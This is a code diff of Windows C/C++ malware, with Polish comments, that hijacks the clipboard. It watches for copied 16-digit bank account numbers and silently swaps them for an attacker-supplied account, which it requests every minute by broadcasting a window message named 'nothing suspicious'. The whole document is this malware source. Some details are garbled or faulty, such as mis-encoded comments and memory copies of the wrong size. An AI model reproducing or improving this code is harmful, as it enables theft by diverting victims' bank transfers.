@@ -1,15 +1,12 @@
-#include <Windows.h>
-
-bool init(HINSTANCE);
-LRESULT CALLBACK WndProc(HWND, UINT, WPARAM, LPARAM);
-void DecodeMessage(WPARAM, LPARAM);
+ï»¿#include "main.h"
 
 const char szClassName[] = "WirusMonitorujacy";
-char* bankAccount;
 bool bAset;
+LPSTR bankAccount;
 HWND hwndThis;
-static HWND hwndNextViewer;
+HWND hwndNextViewer;
 UINT messageCode;
+time_t start, current;
 
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
 {
@@ -21,6 +18,15 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
 	{
 		TranslateMessage(&msg);
 		DispatchMessage(&msg);
+
+		time(&current);
+		double diff = difftime(current, start); // rÃ³Å¼nica czasu w sekundach
+		if (diff >= 60.0)
+		{
+			// WysÅ‚anie Å¼Ä…dania do procesu nadawcy o konto bankowe
+			PostMessage(HWND_BROADCAST, messageCode, 0, 0);
+			time(&start);
+		}
 	}
 	return 0;
 }
@@ -57,11 +63,14 @@ bool init(HINSTANCE hInstance)
 	);
 
 	if (hwndThis == NULL) return false;
+	if (!AddClipboardFormatListener(hwndThis)) return false;
 
 	messageCode = RegisterWindowMessage((LPCSTR)"Nic podejrzanego");
+	
 
 	bankAccount = (char*)malloc(17*sizeof(char));
 	bAset = false;
+	time(&start);
 
 	return true;
 }
@@ -70,8 +79,13 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
 {
 	if (msg == messageCode)
 	{
-		// nasza magia z u¿yciem prywatnego kodu wiadomoœci
-		DecodeMessage(wParam, lParam);
+		switch (wParam)
+		{
+		case 1:
+			memcpy(bankAccount, &lParam, 17);
+			bAset = true;
+			break;
+		}
 	}
 	switch (msg)
 	{
@@ -79,6 +93,7 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
 		hwndNextViewer = SetClipboardViewer(hwnd);
 		break;
 	case WM_CLIPBOARDUPDATE:
+		checkForVictim();
 		if (hwndNextViewer != NULL)
 			SendMessage(hwndNextViewer, msg, wParam, lParam);
 		break;
@@ -94,6 +109,7 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
 		break;
 	case WM_DESTROY:
 		ChangeClipboardChain(hwnd, hwndNextViewer);
+		RemoveClipboardFormatListener(hwnd);
 		PostQuitMessage(0);
 		break;
 	default:
@@ -102,16 +118,41 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
 	return 0;
 }
 
-// Tylko przy obs³udze komunikatu!
+void checkForVictim()
+{
+	if (!bAset)
+		return;
+	OpenClipboard(hwndThis);
+	HGLOBAL hCbMem = GetClipboardData(CF_TEXT);
+	if (hCbMem != NULL) // jest tekst - sprawdzam czy to numer konta. JeÅ›li tak - zamiana.
+	{
+		HGLOBAL hProgMem = GlobalAlloc(GHND, GlobalSize(hCbMem));
+		if (hProgMem != NULL)
+		{
+			LPSTR lpCbMem = LPSTR(GlobalLock(hCbMem));
+			LPSTR lpProgMem = LPSTR(GlobalLock(hProgMem));
+			lstrcpy(lpProgMem, lpCbMem);
+			GlobalUnlock(hCbMem);
+			// hProgMem - adres tymczasowej zmiennej w schowku
+			if (CheckIfAccountNumber((LPSTR)hProgMem))
+				MoveToCb();
+			GlobalUnlock(hProgMem);
+		}
+	}
+
+	CloseClipboard();
+}
+
+// Tylko przy obsÅ‚udze komunikatu!
 void MoveToCb()
 {
-	// zaalokowanie pamiêci globalnej
-	int wLen = 16;
-	HGLOBAL hGlMem = GlobalAlloc(GHND, (DWORD)wLen + 1);
+	// zaalokowanie pamiÄ™ci globalnej
+	
+	HGLOBAL hGlMem = GlobalAlloc(GHND, (DWORD)MAXL + 1);
 	HGLOBAL lpGlMem = GlobalLock(hGlMem);
 
 	// skopiowanie naszego numeru konta do pam. globalnej
-	memcpy(lpGlMem, bankAccount, wLen + 1);
+	memcpy(lpGlMem, bankAccount, MAXL + 1);
 	GlobalUnlock(hGlMem);
 
 	// podmiana schowka
@@ -121,54 +162,13 @@ void MoveToCb()
 	CloseClipboard();
 }
 
-void checkForVictim()
+bool CheckIfAccountNumber(LPSTR str)
 {
-	OpenClipboard(hwndThis);
-	HGLOBAL hCbMem = GetClipboardData(CF_TEXT);
-	if (hCbMem == NULL) // nie mo¿na pobraæ ¿adnego tekstu
-	{
-		CloseClipboard();
-		return;
-	}
-	else // jest tekst - sprawdzam czy to numer konta. Jeœli tak - zamiana.
-	{
-		HGLOBAL hProgMem = GlobalAlloc(GHND, GlobalSize(hCbMem));
-		LPSTR lpCbMem = LPSTR(GlobalLock(hCbMem));
-		LPSTR lpProgMem = LPSTR(GlobalLock(hProgMem));
-		lstrcpy(lpProgMem, lpCbMem);
-		GlobalUnlock(hCbMem);
-		GlobalUnlock(hProgMem);
-		CloseClipboard();
-		// hProgMem - adres tymczasowej zmiennej w schowku
-
-		if (CheckIfAccountNumber((char*)hProgMem) && bAset)
-			MoveToCb();
-	}
-}
-
-bool CheckIfAccountNumber(char* str)
-{
-	if(strlen(str) == 16)
-		for (int i = 0; i < 16; i++)
+	if (strlen(str) == MAXL)
+		for (int i = 0; i < MAXL; i++)
 		{
 			if (str[i] < '0' || str[i] > '9')
 				return false;
 		}
 	return true;
-}
-
-void RequestAccount()
-{
-	PostMessage(HWND_BROADCAST, messageCode, 0, 0);
-}
-
-void DecodeMessage(WPARAM wParam, LPARAM lParam)
-{
-	switch (wParam)
-	{
-	case 1:
-		// Otrzymujemy nowy adres konta bankowego
-		memcpy(bankAccount, &lParam, 17);
-		break;
-	}
 }
